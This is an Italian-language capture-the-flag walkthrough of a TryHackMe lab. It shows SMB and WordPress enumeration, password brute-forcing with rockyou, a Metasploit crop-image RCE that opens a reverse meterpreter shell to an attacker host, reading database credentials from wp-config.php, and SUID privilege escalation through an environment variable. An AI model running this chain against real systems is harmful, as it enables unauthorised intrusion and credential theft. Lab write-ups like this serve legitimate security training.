
#tryhackmelabs #laboratorio 

https://tryhackme.com/r/room/blog

```
nano /etc/hosts                                                    
```

```
map -sV --open -p- 10.10.0.138
```

```
nmap -sV -O -p22,80,139,445 10.10.0.138
```

smb enumerare con nmap le condivisioni

```
nmap -p445 --script smb-enum-shares 10.10.0.138
```

```
nmap --script smb-os-discovery.nse -p 445 10.10.0.138
```
oppure
```
smbmap -H 10.10.0.138
```
oppure
```
use scanner/smb/smb_enumshares
```
otteniamo BillySMB 
```
smbget -R smb://10.10.0.138/anonymous

```
	non va

```
smbget -R smb://10.10.0.138/BillySMB
```
	scarica file direttamente senza password
```
smbclient //10.10.0.138/BillySMB
```
	vede cartella file condivisa
```
ls
```

```
get Alice-White-Rabbit.jpg 
```

```
get tswift.mp4 
```
	scarichiamo i file
```
get check-this.png 
```

```
smb: \> exit
```

```
steghide extract -sf Alice-White-Rabbit.jpg
```
	decrittiamo

```
cat rabbit_hole.txt
```

You've found yourself in a rabbit hole, friend.
niente di buono!

```
wpscan --url http://10.10.161.66 -e vp,u
```

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.161.66/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.161.66/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```
/wp-json/wp/v2/users

```


```
nano users.txt
```

```
bjoel
kwheel
```

```
wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
```

```
[SUCCESS] - kwheel / cutiepie1     
 Username: kwheel, Password: cutiepie1
```

```
search wordpress 5.0
```

```
use multi/http/wp_crop_rce
```

```
set RHOSTS 10.10.7.57
```

```
set USERNAME kwheel
```

```
set PASSWORD cutiepie1
```

```
set LHOST 10.21.9.220
```

```
meterpreter > shell
Process 1704 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (929): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:/var/www/wordpress$ 
```

```
www-data@blog:/home/bjoel$ ls
ls
Billy_Joel_Termination_May20-2020.pdf
user.txt
www-data@blog:/home/bjoel$ cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
www-data@blog:/home/bjoel$ 
```

```
cat /var/www/wordpress/wp-config.php
```
	nel file di configurazione del db troviamo le password

```
/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');
```

```
mysql -h 10.10.7.57 -u wordpressuser -p
```


```
meterpreter > shell
Process 1931 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (929): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:~/wordpress$
```

```
find / -user root -perm /4000 -print 2>/dev/null
```

```
/usr/sbin/checker
```

```
www-data@blog:~/wordpress$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
www-data@blog:~/wordpress$ 
```

```
file /usr/sbin/checker
```

```
ile /usr/sbin/checker
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped

```
L'eseguibile è un ELF a 64 bit:


Eseguendolo con ltrace si scopre che l'eseguibile sta controllando una variabile di ambiente (admin) per determinare se siamo amministratori:
```
ltrace /usr/sbin/checker
```

```
www-data@blog:~/wordpress$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
www-data@blog:~/wordpress$ 

```

Creiamo una variabile di ambiente di amministrazione e impostiamola su 1:

```
export admin=1
```

```
/usr/sbin/checker
```

```
cd /root

```

```
whoami
```

```
ls
root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```

```
find / -type f -name user.txt 2>/dev/null
```

/media/usb/user.txt

```
cat /media/usb/user.txt
c842xxxxxxxxxxxxxxxxxxxxxxxx
```


